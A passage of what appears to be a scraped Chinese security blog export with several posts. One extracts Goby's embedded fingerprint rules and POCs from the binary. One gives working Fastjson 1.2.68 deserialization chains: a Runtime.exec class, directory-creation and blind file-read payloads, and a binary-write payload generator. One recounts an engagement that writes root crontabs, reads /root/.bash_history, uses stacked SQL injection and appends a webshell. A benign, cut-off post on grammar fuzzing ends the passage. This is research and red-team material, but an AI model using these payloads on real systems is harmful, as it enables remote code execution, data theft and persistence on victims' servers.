6F 65 79 65\n接下来就是将这两段之间的内容提取出来，笔者最近正好在学习Go，就用Go写了个辣眼的提取脚本\npackage main\n\nimport (\n    \"io/ioutil\"\n    \"fmt\"\n    \"strings\"\n    \"os\"\n)\n\nfunc Read()(string){\n    f, err := ioutil.ReadFile(\"/home/ubuntu/go/gopro/crules\")\n    if err != nil {\n        fmt.Println(\"read fail\", err)\n    }\n    return string(f)\n}\n\nfunc Write(s string)  {\n    fileName := \"finger.txt\"\n    var d1 = []byte(s)\n    f, err3 := os.Create(fileName) //创建文件\n    if err3 != nil{\n        fmt.Println(\"create file fail\")\n    }\n    defer f.Close()\n    n2, err3 := f.Write(d1) //写入文件(字节数组)\n    fmt.Printf(\"写入 %d 个字节n\", n2)\n    f.Sync()\n}\n\nfunc main() {\n    crules := Read()\n    start := strings.Index(crules, \"\\x64\\x65\\x66\\x61\\x75\\x6C\\x74\\x00\")\n    end := strings.Index(crules, \"\\x00\\x00\\x66\\x6F\\x65\\x79\\x65\\x00\")\n    finger := crules[start : end]\n    Write(finger)\n}\n\n\n真的辣眼睛，因为妹有做分割，真没眼看。。。。\n接下来就是进行分割，观察不同的rule_id之间的字节\n由此可以确定不同规则rule_id之间的分隔符为\\x00\\x00\\x00\\x00\\x73\\x00 ,不同字段之间的分隔符为\\x00 \n尝试对其进行拆分，这段写得太辣眼睛了，还是放师傅的脚本吧\nfilename = r\"crules\"\nwith open(filename, 'rb') as f:\n    data = f.read()\nstart = data.index(b\"default\\x00fofa\")\nend = data.index(b\"\\x00\" * 16, start)\ndata = data[start:end]\ndatas = data.split(b\"rule_id\")[1:]\nsep = b\"\\x00\"\noptions_set = set()\nresults = []\nfor item in datas:\n    ff = item.split(sep)\n    rule_id = ff[1].decode()\n    level = ff[3].decode()\n    softhard = ff[5].decode()\n    product = ff[7].decode()\n    company = ff[9].decode()\n    category = ff[11].decode()\n    parent_category = ff[13].decode()\n    dd = {\n        \"rule_id\": rule_id,\n        \"level\": level,\n        \"softhard\": softhard,\n        \"product\": product,\n        \"company\": company,\n        \"category\": category,\n        \"parent_category\": parent_category,\n        \"rules\": []\n    }\n    bb = b'\\x00'.join(ff[14:])\n    s = bb.split(b'\\x00\\x00\\x00\\x00\\x73\\x00')\n    _rr2 = []\n    for rr in s:\n        _rules = []\n        if not rr.startswith(b'fofa'):\n            continue\n        index = 0\n        while index &lt; len(rr):\n            prefixx = b\"fofa\\x00\"\n            try:\n                start = rr.index(prefixx, index) + len(prefixx)\n            except:\n                break\n            end = rr.index(b'\\x00', start)\n            match_way = rr[start:end].decode()\n            _length = rr[end + 1]\n            content = rr[end + 9:end + 9 + _length]\n            index = end + 9 + _length\n            _rules.append(\n                {\n                    \"match\": match_way,\n                    \"content\": content.decode('utf-8', errors=\"ignore\")\n                }\n            )\n        _rr2.append(_rules)\n    dd[\"rules\"] = _rr2\n    results.append(dd)\nprint(results)\nwith open(\"fofa.json\", \"w\", encoding=\"utf-8\") as f:\n    import json\n    json.dump(results, f, ensure_ascii=False, indent=4)\n\n最后得到结果如下\n\n1.7.1921.7.192版本不在含有crules文件，它被包含在了可执行程序中，打开可执行程序可以看到其中引用了github.com/rakyll/statik/fs 库，官方的描述如下：statik allows you to embed a directory of static files into your Go binary根据师傅的文章，我们也可以查看fs的源码fs.go的源码发现该库即是生成了ZIP内嵌在程序中笔者之前有过一些Misc经验（雾，这里列出常见的文件头\n\n\n\nType\n文件头\n文件尾\n\n\n\nJEPG\nFFD8FF\nFFD9\n\n\nPNG\n89504E47\nAE426082\n\n\nGIF\n47484638\n003B\n\n\nZIP\n504B0304\n504B\n\n\nTIFF\n49492A00\n\n\n\nXML\n68746D6C3E\n\n\n\nPDF\n25504446\n\n\n\nRAR\n52617221\n\n\n\n这里搜索ZIP的格式头50 4B 03 04 即可定位到压缩包的起始位置\n\n看到crules，就应该是这个压缩包了，接下来就是寻找结尾进行提取压缩包文件。因为50 4B 03 04 这段数据在文本中有很多，在进行提取的时候可以多选几个字节进行准确定位，这里师傅网友多定了一个字节到50 4B 03 04 14 00 08 00 08 00\n接下来寻找压缩包结尾，先看看50 4B 的搜索结果\n在搜索开始头的时候就能看到存在这么多的50 4B 如果直接提取到下一个50 4B 无法判断压缩包的准确性，借鉴师傅的解决方法，每次读字节并且尝试解压，代码如下：\n# @Author  : w8ay\nimport zipfile\nfrom io import BytesIO\n\nfilename = \"goby-cmd-linux\"\nwith open(filename, 'rb') as stream:\n    data = stream.read()\n    start = data.find(b'\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00')\n    end = start + 1200\nwhile True:\n    fenli = data[start:end]\n    try:\n        fio = BytesIO(fenli)\n        f = zipfile.ZipFile(file=fio)\n        print(fenli[:100])\n        print(fenli[-10:])\n        print(len(fenli) // 1024)\n        print(f.namelist())\n        break\n    except zipfile.BadZipFile:\n        end += 1\nwith open(\"test.zip\", 'wb') as f:\n    f.write(fenli)\n\n成功分离出crules_1.7.192，用之前的提取脚本提取即可\n这个微微离谱的指纹还在\n\nGoby Poc提取Goby的POC分为json与go两种格式，本次只尝试提取json’格式（wtcldbq\n用winhex打开可执行程序观察\n\n可以直接确认Name段，那么提取数据的起始段也可以确认为\\x23\\x7B\\x0A\\x20\\x20\\x22\\x4E\\x61\\x6D\\x65\\x22\\x3A\\x20（在看的时候搜索Name字段第二个处的CS字段与下面不同，不知道为啥师傅没有提取结束段标记为\\x65\\x0A\\x7D\\x0A\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E\n暴力提取辣眼脚本：\npackage main\n\nimport (\n    \"io/ioutil\"\n    \"fmt\"\n    \"strings\"\n    \"os\"\n)\n\nfunc Read()(string){\n    f, err := ioutil.ReadFile(\"goby_1.8\")\n    if err != nil {\n        fmt.Println(\"read fail\", err)\n    }\n    return string(f)\n}\n\nfunc Write(s string) {\n    fileName := \"finger.json\"\n    var d1 = []byte(s)\n    f, err3 := os.Create(fileName) //创建文件\n    if err3 != nil{\n        fmt.Println(\"create file fail\")\n    }\n    defer f.Close()\n    n2, err3 := f.Write(d1) //写入文件(字节数组)\n    fmt.Printf(\"写入 %d 个字节n\", n2)\n    f.Sync()\n}\n\nfunc main() {\n    crules := Read()\n    start := strings.Index(crules, \"\\x23\\x7B\\x0A\\x20\\x20\\x22\\x4E\\x61\\x6D\\x65\\x22\\x3A\\x20\")\n    end := strings.Index(crules, \"\\x65\\x0A\\x7D\\x0A\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E\")\n    finger := crules[start + 1 : end + 3]\n    Write(finger)\n}\n\n\n提取结果如下\n但是存在一些不可见字符干扰，后续再优化\n总结首先是 W8ay师傅太强了orz，后面到了逆向yara虚拟机的程度，对字符处理也很细节，学，学无止境。wtcl。。\n以后要忠实的做好每一个大佬的舔狗\n\n","slug":"Goby指纹和POC提取","date":"2022-09-30T02:48:45.000Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"RainSec"},{"id":"fb1b22e9cffe64caefaaf1ad19f54d41","title":"Fastjson 1.2.80调试小记","content":"fastjson 1.2.68 反序列化rce探索前言  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法\nJDK8任意文件写场景下的Fastjson RCE  通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.forName 就会加载charsets.jar，这样来讲正常的业务代码中几乎都已经加载过charsets.jar，即使后来再覆盖charsets.jar也不会重新加载。仅为笔者个人（java初学者）想法（或许是在哪里看到过别的师傅的文章，有点印象），如有错误欢迎师傅指点。\n  threedr3am师傅给出了任意文件写的情况下，如何更稳定地rce。简单来讲如果写一个恶意的class到jre/classes/目录下，class内容如下：\nimport java.io.IOException;\n\npublic class MyClass implements AutoCloseable {\n    public MyClass(String cmd) throws IOException {\n        Runtime.getRuntime().exec(cmd);\n    }\n\n    public void close() throws Exception {\n    }\n\n    static {\n        try {\n            Runtime.getRuntime().exec(\"open -a Calculator\");\n        } catch (IOException var1) {\n            throw new RuntimeException(var1);\n        }\n    }\n}\n\n  正在运行的项目会加载这个class文件，我们只需要使用如下poc即可rce。\n{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"MyClass\",\"cmd\":\"open -a Calculator\"}\n  这里只做简述，具体原理到threedr3am师傅的博客中查看。\n  很可惜的是jre目录下默认并不会存在classes目录，另外voidfyoo师傅给出的Commons IO 写文件链子不能写二进制文件，具体原因是使用的输入输出流都是经过编码的，而二进制文件中部分字符编码/解码失败就会写入脏字符。那么目前我们需要解决的问题有三点：\n\n获取jdk目录\n创建classes目录\n写入class文件\n\n获取jdk目录  在Blackhat的议题中分享了一条commons-io逐字节读文件的链子，但是局限性很大。经过浅蓝师傅的扩展，目前可以做到有抛出异常的布尔读和利用dnslog 无回显读 ,贴一下浅蓝师傅的有抛出异常的布尔读取文件的poc：\n{\n  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n    \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n      \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n        \"url\": \"file:///tmp/test\"\n      },\n      \"charsetName\": \"UTF-8\",\n      \"bufferSize\": 1024\n    },\"boms\": [\n      {\n        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n        \"charsetName\": \"UTF-8\",\n        \"bytes\": [\n          98\n        ]\n      }\n    ]\n  },\n  \"address\" : {\"@type\": \"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\": 0,\"end\": 0}\n}\n  当字节码对比一致时就会走到下面charSequence处，因为类型不一致fastjson报错，业务抛出异常，字节码对比不一致时返回为null，fastjson也就不会报错，业务回显正常。我们可以直接读取启动命令 /proc/self/cmdline， 有的时候直接是用绝对路径来启动的，如果不是可以用netdoc协议列目录找到jdk路径\n创建classes目录  笔者找到一条简单的通过Commons IO创建目录的链子，使用的类是org.apache.commons.io.output.LockableFileWriter\npublic LockableFileWriter(File file, Charset encoding, boolean append, String lockDir) throws IOException {\n        file = file.getAbsoluteFile();\n        if (file.getParentFile() != null) {\n            FileUtils.forceMkdir(file.getParentFile());\n        }\n\n        if (file.isDirectory()) {\n            throw new IOException(\"File specified is a directory\");\n        } else {\n            if (lockDir == null) {\n                lockDir = System.getProperty(\"java.io.tmpdir\");\n            }\n\n            File lockDirFile = new File(lockDir);\n            FileUtils.forceMkdir(lockDirFile);\n            this.testLockDir(lockDirFile);\n            this.lockFile = new File(lockDirFile, file.getName() + \".lck\");\n            this.createLock();\n            this.out = this.initWriter(file, encoding, append);\n        }\n    }\n\n\nFileUtils#forceMkdir\n\n\npublic static void forceMkdir(File directory) throws IOException {\n        ......\n        if (directory.exists()) {\n            ......\n        } else if (!directory.mkdirs() &amp;&amp; !directory.isDirectory()) {\n          ......\n        }\n\n    }\n\npoc\n{\n \"@type\":\"java.lang.AutoCloseable\",\n \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n \"writer\":{\n \"@type\":\"org.apache.commons.io.output.LockableFileWriter\",\n \"file\":\"/etc/passwd\", //一个存在的文件\n \"encoding\":\"UTF-8\",\n \"append\": true,\n\"lockDir\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\" //要创建的目录\n },\n \"charset\":\"UTF-8\",\n \"bufferSize\": 8193,\n \"writeImmediately\": true\n }\n  file需要是一个存在的文件，才能走到下面的FileUtils.forceMkdir(lockDirFile) 创建目录注：mac环境下可能有保护机制，jre下classes创建不了，实测ubuntu上是可以创建的。\n写入class文件  笔者能力有限，只依赖commons-io 未能找到一条写二进制文件的链子，在Blackhat的议题中分享了一条基于commons-io、commons-codec、aspectj写二进制文件的链，笔者近日打的fastjson刚好有commons-io、commons-codec，但是没有aspectj。于是在另一位师傅列出lib之后，在ant中找到了org.apache.tools.ant.util.LazyFileOutputStream 类，可以替代aspectj中的org.eclipse.core.internal.localstore.SafeFileOutputStream\npublic static void write_so(String target_path) throws IOException {\n    byte[] bom_buffer_bytes = readFileInBytesToString(\"./target/classes/MyClass.class\");\n    String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);\n    byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);\n    String payload = String.format(\"{\\n\" +\n                \"  \\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\n\" +\n                \"  \\\"@type\\\":\\\"org.apache.commons.io.input.BOMInputStream\\\",\\n\" +\n                \"  \\\"delegate\\\":{\\n\" +\n                \"    \\\"@type\\\":\\\"org.apache.commons.io.input.TeeInputStream\\\",\\n\" +\n                \"    \\\"input\\\":{\\n\" +\n                \"      \\\"@type\\\": \\\"org.apache.commons.codec.binary.Base64InputStream\\\",\\n\" +\n                \"      \\\"in\\\":{\\n\" +\n                \"        \\\"@type\\\":\\\"org.apache.commons.io.input.CharSequenceInputStream\\\",\\n\" +\n                \"        \\\"charset\\\":\\\"utf-8\\\",\\n\" +\n                \"        \\\"bufferSize\\\": 1024,\\n\" +\n                \"        \\\"cs\\\":{\\\"@type\\\":\\\"java.lang.String\\\"\\\"%1$s\\\"\\n\" +\n                \"      },\\n\" +\n                \"      \\\"doEncode\\\":false,\\n\" +\n                \"      \\\"lineLength\\\":1024,\\n\" +\n                \"      \\\"lineSeparator\\\":\\\"5ZWKCg==\\\",\\n\" +\n                \"      \\\"decodingPolicy\\\":0\\n\" +\n                \"    },\\n\" +\n                \"    \\\"branch\\\":{\\n\" +\n                //\"      \\\"@type\\\":\\\"org.eclipse.core.internal.localstore.SafeFileOutputStream\\\",\\n\" +\n                //\"      \\\"targetPath\\\":\\\"%2$s\\\"\\n\" +\n                \"      \\\"@type\\\":\\\"org.apache.tools.ant.util.LazyFileOutputStream\\\",\\n\" +\n                \"      \\\"file\\\":\\\"%2$s\\\",\\n\" +\n                \"      \\\"append\\\":false,\\n\" +\n                \"      \\\"alwaysCreate\\\":true\\n\" +\n                \"    },\\n\" +\n                \"    \\\"closeBranch\\\":false\\n\" +\n                \"  },\\n\" +\n                \"  \\\"include\\\":true,\\n\" +\n                \"  \\\"boms\\\":[{\\n\" +\n                \"                  \\\"@type\\\": \\\"org.apache.commons.io.ByteOrderMark\\\",\\n\" +\n                \"                  \\\"charsetName\\\": \\\"UTF-8\\\",\\n\" +\n                \"                  \\\"bytes\\\":\" +\"%3$s\\n\" +\n                \"                }],\\n\" +\n                \"  \\\"x\\\":{\\\"$ref\\\":\\\"$.bOM\\\"}\\n\" +\n                \"}\",base64_so_content, \"/tmp/MyClass.class\", Arrays.toString(big_bom_buffer_bytes));\n    System.out.println(payload);\n}\npublic static byte[] readFileInBytesToString(String filePath) {\n        final int readArraySizePerRead = 4096;\n        File file = new File(filePath);\n        ArrayList&lt;Byte&gt; bytes = new ArrayList&lt;&gt;();\n        try {\n            if (file.exists()) {\n                DataInputStream isr = new DataInputStream(new FileInputStream(\n                        file));\n                byte[] tempchars = new byte[readArraySizePerRead];\n                int charsReadCount = 0;\n\n                while ((charsReadCount = isr.read(tempchars)) != -1) {\n                    for(int i = 0 ; i &lt; charsReadCount ; i++){\n                        bytes.add (tempchars[i]);\n                    }\n                }\n                isr.close();\n            }\n        } catch (IOException e) {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        }\n\n        return toPrimitives(bytes.toArray(new Byte[0]));\n    }\n\n    static byte[] toPrimitives(Byte[] oBytes) {\n        byte[] bytes = new byte[oBytes.length];\n\n        for (int i = 0; i &lt; oBytes.length; i++) {\n            bytes[i] = oBytes[i];\n        }\n\n        return bytes;\n    }\n  笔者在vps用jar起的环境和本地手动创建classes目录之后都是可以成功的。\n\n  但是打的站没成功，别的师傅通过别的链打下来后，笔者上去看了下class文件没问题，也能直接运行，但是很奇怪用fastjson加载不了。\n最后  在root权限下可以直接通过commons-io链写计划任务，低权限下通过写class文件rce，获取jdk目录、创建classes目录仅依赖commons-io，但是写入class文件需要更多不太常见的依赖，总的来讲利用条件还是较为苛刻的。\n参考\n\n\n\n\n\n\n\n\n\nFastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析(https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)\nBlackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用(https://paper.seebug.org/1698/#3commons-io)\nfastjson 读文件 gadget 的利用场景扩展(https://b1ue.cn/archives/506.html)\nJDK8任意文件写场景下的Fastjson RCE(https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/)\n\n","slug":"fastjson 1.2.80调试小记","date":"2022-09-27T10:38:45.000Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"RainSec"},{"id":"caead448310a4a1bf0047aa168443e2c","title":"一次攻防小记","content":"一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。\nfastjson利用随手一试fastjson jdk8 写文件的链\n{ \"x\":{\n        \"@type\":\"java.lang.AutoCloseable\", \n        \"@type\":\"sun.rmi.server.MarshalOutputStream\",\n        \"out\":{\n            \"@type\":\"java.util.zip.InflaterOutputStream\",\n            \"out\":{\n                \"@type\":\"java.io.FileOutputStream\",\n                \"file\":\"/var/spool/cron/crontabs/root\",\n                \"append\":false\n            },\n            \"infl\":{\n                \"input\":\"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL\"\n            },\n            \"bufLen\":1048576\n        },\n        \"protocolVersion\":1\n    }}\n压缩数据生成\nfrom itsdangerous import base64_decode, base64_encode\nimport zlib\ncc='hello'.encode()\nccc=zlib.compress(cc)\nprint(base64_encode(ccc))\n居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子\n{\n  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n    \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n      \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n        \"url\": \"file:///tmp/\"\n      },\n      \"charsetName\": \"UTF-8\",\n      \"bufferSize\": 1024\n    },\"boms\": [\n      {\n        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n        \"charsetName\": \"UTF-8\",\n        \"bytes\": [\n          ...\n        ]\n      }\n    ]\n  },\n  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n}\n但是没有回显，无法判断，随后拜读浅蓝师傅的文章 https://b1ue.cn/archives/506.html\n前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件\n通过读/root/.bash_history等拿到tomcat路径\n{\n  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n    \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n      \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n        \"url\": \"file:///tmp/test\"\n      },\n      \"charsetName\": \"UTF-8\",\n      \"bufferSize\": 1024\n    },\"boms\": [\n      {\n        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n        \"charsetName\": \"UTF-8\",\n        \"bytes\": [\n          98\n        ]\n      }\n    ]\n  },\n  \"address\" : {\"@type\": \"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\": 0,\"end\": 0}\n}\n但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。\n写计划任务试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。\nSQL注入fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 https://xz.aliyun.com/t/7169#toc-32\ndrop table mysql.m1;\nCREATE TABLE mysql.m1 (code TEXT );\nLOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';\nselect * from mysql.m1;\n可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。\n二战过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 \n\"@type\":\"xxxx\"\n\n一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。\n","slug":"一次攻防小记","date":"2022-08-24T10:38:45.000Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"RainSec"},{"id":"001f56a1173240fc9f846bb4717903d4","title":"Fuzzing之Grammars","content":"Fuzzing之GrammarsFuzzing input​  Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。\n​  为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如编译器的输入：python解释器规定了符合python语法的程序才能得以执行，gcc规定了符合C语言语法的程序才能被完成编译进而生成二进制文件。Fuzzing也是如此，为了很好的达到Fuzzing的效果，为程序定义一种输入的语法规范往往是一种不错的选择。\n​  一般而言，对于Fuzzing简单的程序来说，正则表达式往往是一个不错的选择，它所具备的有限状态机属性使得它易于推理进而获得一个满意的Input。但是如果面临的Fuzzing目标需要非常复杂的输入，那么它就会表现的捉襟见肘。\n​  我曾见过为了更好的实现某些功能而专门设计一些语言，从计算机理论的角度这显然是非常有用的，一些特殊功能在特殊语言的加持之下表现出超高的质量，但是对于Fuzzing而言这确实是成本过高了，Grammars其实就是正则表达式和专业语言之间的一个中间地带。它易于理解，并且能很好的完成Fuzzing对它的期望–生成大量合法输入，因为通过Grammars可以规定Inputs的大量属性，完美的表达一个复杂输入的语法结构。\nGrammars初探​  Grammar一般由符号和一组表达式组成，例如A = 10 | 9 | 0 |1，符号化使得递归成为可能，假设B = A | AB，这无疑就使得符号所代表的范围倍增。根据这种思想我们可以制作一个算数表达式：\n&lt;start&gt;   ::= &lt;expr&gt;\n&lt;expr&gt;    ::= &lt;term&gt; + &lt;expr&gt; | &lt;term&gt; - &lt;expr&gt; | &lt;term&gt;\n&lt;term&gt;    ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;\n&lt;factor&gt;  ::= +&lt;factor&gt; | -&lt;factor&gt; | (&lt;expr&gt;) | &lt;integer&gt; | &lt;integer&gt;.&lt;integer&gt;\n&lt;integer&gt; ::= &lt;digit&gt;&lt;integer&gt; | &lt;digit&gt;\n&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9\n\n那么通过对&lt;start&gt;的内部的符号进行逐一扩展，并对过程进行随机化处理，最终就可以得到大量的合法算数表达式。和大多数语法一样，Grammar也应该有自己的Type，以便对其合法性进行校验，以Python 为例子可以对上述的Grammar进行定义：\nOption = Dict[str, Any]\nExpansion = Union[str, Tuple[str, Option]]\nGrammar = Dict[str, List[Expansion]]\nEXPR_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\":\n        [\"&lt;expr&gt;\"],\n\n    \"&lt;expr&gt;\":\n        [\"&lt;term&gt; + &lt;expr&gt;\", \"&lt;term&gt; - &lt;expr&gt;\", \"&lt;term&gt;\"],\n\n    \"&lt;term&gt;\":\n        [\"&lt;factor&gt; * &lt;term&gt;\", \"&lt;factor&gt; / &lt;term&gt;\", \"&lt;factor&gt;\"],\n\n    \"&lt;factor&gt;\":\n        [\"+&lt;factor&gt;\",\n        \"-&lt;factor&gt;\",\n        \"(&lt;expr&gt;)\",\n        \"&lt;integer&gt;.&lt;integer&gt;\",\n        \"&lt;integer&gt;\"],\n\n    \"&lt;integer&gt;\":\n        [\"&lt;digit&gt;&lt;integer&gt;\", \"&lt;digit&gt;\"],\n\n    \"&lt;digit&gt;\":\n        [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n}\n\n前三行代码定义了一个Grammar应该如何在Python中构成。通过代码中的EXPR_GRAMMAR[\"&lt;digit&gt;\"]可以访问当前Grammar的各个组成部分并对其进行操作。\nSample Grammar Fuzz​  那么该如何对Grammar语法进行解析呢？一种最简单的方式就是通过字符串替换，因为在Grammar中:的左右两侧本身就是一种映射关系，因此利用字符串替换不断迭代是一种最为直观的选择。\n实例代码：\nSTART_SYMBOL = \"&lt;start&gt;\"\n# 一个简单的gramar fuzzer\ndef simple_grammar_fuzzer(grammar: Grammar, \n                          start_symbol: str = START_SYMBOL,\n                          max_nonterminals: int = 10,\n                          max_expansion_trials: int = 100,\n                          log: bool = False) -&gt; str:\n    \"\"\"Produce a string from `grammar`.\n       `start_symbol`: use a start symbol other than `&lt;start&gt;` (default).\n       `max_nonterminals`: the maximum number of nonterminals \n         still left for expansion\n       `max_expansion_trials`: maximum # of attempts to produce a string\n       `log`: print expansion progress if True\"\"\"\n\n    term = start_symbol\n    expansion_trials = 0\n\n    while len(nonterminals(term)) &gt; 0: # 判断字符串中是否存在&lt;&gt;，并返回所有被&lt;&gt;包裹的项，注意如果是&lt;dsad&lt;abc&gt;&gt;则返回&lt;abc&gt;\n        symbol_to_expand = random.choice(nonterminals(term))\n        expansions = grammar[symbol_to_expand]\n        expansion = random.choice(expansions)\n        # In later chapters, we allow expansions to be tuples,\n        # with the expansion being the first element\n        if isinstance(expansion, tuple):\n            expansion = expansion[0]\n\n        new_term = term.replace(symbol_to_expand, expansion, 1) # 解析下一个符号\n\n        if len(nonterminals(new_term)) &lt; max_nonterminals: # 每次的可解析符号，必须少于最大单次解析量\n            term = new_term\n            if log:\n                print(\"%-40s\" % (symbol_to_expand + \" -&gt; \" + expansion), term)\n            expansion_trials = 0\n        else:\n            expansion_trials += 1\n            if expansion_trials &gt;= max_expansion_trials: # 总的解析次数也存在限制\n                raise ExpansionError(\"Cannot expand \" + repr(term))\n\n    return term\n\n利用上面的表达式Grammar可以制作一个简单的grammar fuzz，Fuzz的编写过程其实面临着很多的取舍，便利和速度或者各种各样的可行性之间的考虑，以上面的Grammar为例子，我们肯定不希望其陷入类似无限递归或者大量符号解析的情况，而是会限制对字段的提取次数和对符号的解析次数。\n​  但是此类Grammar Fuzz都面临几个问题就是大量的字符串搜索和替换操作导致效率低下，而且可以看出存在Input生成失败的情况（ExpansionError），而且这是一个典型的上下文无关的Fuzz。不过，依赖于上述功能，我们只要编写Grammar就可以很好的对一些Inputs进行大量生成。\n比如URL生成：\nURL_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\":\n        [\"&lt;url&gt;\"],\n    \"&lt;url&gt;\":\n        [\"&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;\"],\n    \"&lt;scheme&gt;\":\n        [\"http\", \"https\", \"ftp\", \"ftps\"],\n    \"&lt;authority&gt;\":\n        [\"&lt;host&gt;\", \"&lt;host&gt;:&lt;port&gt;\", \"&lt;userinfo&gt;@&lt;host&gt;\", \"&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;\"],\n    \"&lt;host&gt;\":  # 大部分情况下其实可以指定一个URL\n        [\"cispa.saarland\", \"www.google.com\", \"fuzzingbook.com\"],\n    \"&lt;port&gt;\":\n        [\"80\", \"8080\", \"&lt;nat&gt;\"],\n    \"&lt;nat&gt;\":\n        